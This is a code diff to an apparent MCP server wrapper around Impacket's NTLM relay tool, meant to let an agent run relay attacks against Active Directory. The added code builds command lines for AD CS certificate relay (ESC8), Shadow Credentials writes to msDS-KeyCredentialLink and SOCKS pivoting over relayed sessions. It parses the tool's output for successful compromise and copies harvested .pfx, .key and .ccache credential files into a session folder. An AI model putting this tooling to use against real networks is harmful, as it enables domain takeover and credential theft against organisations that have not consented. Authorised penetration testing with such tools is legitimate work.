@@ -10,6 +10,9 @@ Follows the chisel MCP server pattern for stateful process tracking.
 """
 
 import asyncio
+import glob
+import os
+import shutil
 import socket
 from typing import Any, Dict, Optional
 
@@ -65,6 +68,35 @@ class ImpacketRelayServer(BaseMCPServer):
                     "type": "boolean",
                     "default": False,
                     "description": "Remove MIC for cross-protocol relay (--remove-mic)",
+                },
+                "adcs": {
+                    "type": "boolean",
+                    "default": False,
+                    "description": "Perform AD CS relay attack (ESC8). Requires adcs_template.",
+                },
+                "adcs_template": {
+                    "type": "string",
+                    "description": "Certificate template for ADCS relay (use with adcs=true).",
+                },
+                "shadow_credentials": {
+                    "type": "boolean",
+                    "default": False,
+                    "description": "Perform Shadow Credentials relay attack (adds msDS-KeyCredentialLink).",
+                },
+                "no_smb_server": {
+                    "type": "boolean",
+                    "default": False,
+                    "description": "Disable the default SMB listener (use when only HTTP relay is needed).",
+                },
+                "no_http_server": {
+                    "type": "boolean",
+                    "default": False,
+                    "description": "Disable the default HTTP listener (use when only SMB relay is needed).",
+                },
+                "socks": {
+                    "type": "boolean",
+                    "default": False,
+                    "description": "Enable SOCKS proxy for relayed authenticated sessions.",
                 },
                 "additional_args": {
                     "type": "string",
@@ -128,6 +160,8 @@ class ImpacketRelayServer(BaseMCPServer):
             "connections": [],
             "relay_succeeded": False,
             "delegation_written": False,
+            "adcs_succeeded": False,
+            "shadow_credentials_succeeded": False,
             "errors": [],
         }
 
@@ -136,11 +170,13 @@ class ImpacketRelayServer(BaseMCPServer):
             if not stripped:
                 continue
 
+            lower = stripped.lower()
+
             # Connection received
-            if "connection from" in stripped.lower():
+            if "connection from" in lower:
                 result["connections"].append(stripped)
             # Relay success indicators
-            if any(ind in stripped.lower() for ind in [
+            if any(ind in lower for ind in [
                 "authenticating against",
                 "modify_add",
                 "written successfully",
@@ -149,10 +185,18 @@ class ImpacketRelayServer(BaseMCPServer):
             ]):
                 result["relay_succeeded"] = True
             # RBCD delegation
-            if "delegation" in stripped.lower() and "written" in stripped.lower():
+            if "delegation" in lower and "written" in lower:
                 result["delegation_written"] = True
+            # ADCS relay success (certificate obtained)
+            if "certificate" in lower and ("generated" in lower or "saved" in lower or "obtained" in lower):
+                result["adcs_succeeded"] = True
+                result["relay_succeeded"] = True
+            # Shadow Credentials success
+            if "keycredentiallink" in lower and ("added" in lower or "written" in lower or "updated" in lower):
+                result["shadow_credentials_succeeded"] = True
+                result["relay_succeeded"] = True
             # Errors
-            if stripped.startswith("[-]") or "error" in stripped.lower():
+            if stripped.startswith("[-]") or "error" in lower:
                 result["errors"].append(stripped)
 
         return result
@@ -180,6 +224,12 @@ class ImpacketRelayServer(BaseMCPServer):
         delegate_access: bool = False,
         escalate_user: Optional[str] = None,
         remove_mic: bool = False,
+        adcs: bool = False,
+        adcs_template: Optional[str] = None,
+        shadow_credentials: bool = False,
+        no_smb_server: bool = False,
+        no_http_server: bool = False,
+        socks: bool = False,
         additional_args: Optional[str] = None,
         timeout: int = 300,
     ) -> ToolResult:
@@ -201,12 +251,29 @@ class ImpacketRelayServer(BaseMCPServer):
             cmd.extend(["--escalate-user", escalate_user])
         if remove_mic:
             cmd.append("--remove-mic")
+        if adcs:
+            cmd.append("--adcs")
+        if adcs_template:
+            cmd.extend(["--template", adcs_template])
+        if shadow_credentials:
+            cmd.append("--shadow-credentials")
+        if no_http_server:
+            cmd.append("--no-http-server")
+        if socks:
+            cmd.append("-socks")
 
         # Set listen port based on protocol
         if listen_port == 445:
             cmd.extend(["--smb-port", str(listen_port)])
         elif listen_port != 80:
             cmd.extend(["--http-port", str(listen_port)])
+
+        # Auto-disable SMB listener when not on port 445 (avoids port conflict),
+        # unless socks mode is enabled (socks needs SMB for initial auth)
+        if no_smb_server:
+            cmd.append("--no-smb-server")
+        elif listen_port != 445 and not socks and "--no-smb-server" not in cmd:
+            cmd.append("--no-smb-server")
 
         if additional_args:
             cmd.extend(additional_args.split())
@@ -356,6 +423,20 @@ class ImpacketRelayServer(BaseMCPServer):
 
         parsed = self._parse_relay_output(info["output_buffer"])
         final_output = info["output_buffer"]
+
+        # Collect relay artifacts (certificates, keys, etc.)
+        artifact_dir = "/session/relay"
+        collected_artifacts = []
+        try:
+            os.makedirs(artifact_dir, exist_ok=True)
+            for ext in ["*.pfx", "*.pem", "*.key", "*.cert", "*.ccache"]:
+                for f in glob.glob(ext):
+                    shutil.copy2(f, artifact_dir)
+                    collected_artifacts.append(os.path.basename(f))
+        except Exception as e:
+            self.logger.warning(f"Artifact collection failed: {e}")
+        if collected_artifacts:
+            parsed["artifacts"] = collected_artifacts
 
         # Wait for port release
         listen_port = info.get("listen_port")
